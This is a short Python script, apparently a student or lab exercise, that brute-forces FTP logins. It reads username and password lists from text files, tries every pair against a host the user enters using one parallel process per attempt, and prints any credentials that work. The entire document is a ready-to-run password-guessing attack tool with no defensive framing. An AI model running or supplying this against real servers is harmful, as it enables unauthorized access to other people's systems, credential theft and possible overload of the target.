#Kyle Pendleton
#11/11/2024
#This script will attempt to bruteforce access to an ftp server using the files containing usernames and passwords

#!/usr/bin/env python3

import ftplib
import multiprocessing

def brute_force(connection,username,user_password):
    ftp_connection = ftplib.FTP(connection)
    try:
        print("Testing user {}, password {}".format(username, user_password))
        response = ftp_connection.login(username,user_password)
        if "230" in response and "access granted" in response:
            print("[*]Successful brute force")
            print("User: "+ username + " Password: "+user_password)
        else:
            pass
    except Exception as exception:
        print('Connection error', exception)

def main():
    host = input("Enter IP address or host name:")
    with open('ftp_users.txt','r') as usernames:
        users = usernames.readlines()
    with open('ftp_passwords.txt','r') as user_passwords:
        passwords = user_passwords.readlines()
    for user in users:
        for password in passwords:
            process = multiprocessing.Process(target=brute_force,
            args=(host,user.rstrip(),password.rstrip(),))
            process.start()
if __name__ == '__main__':
    main()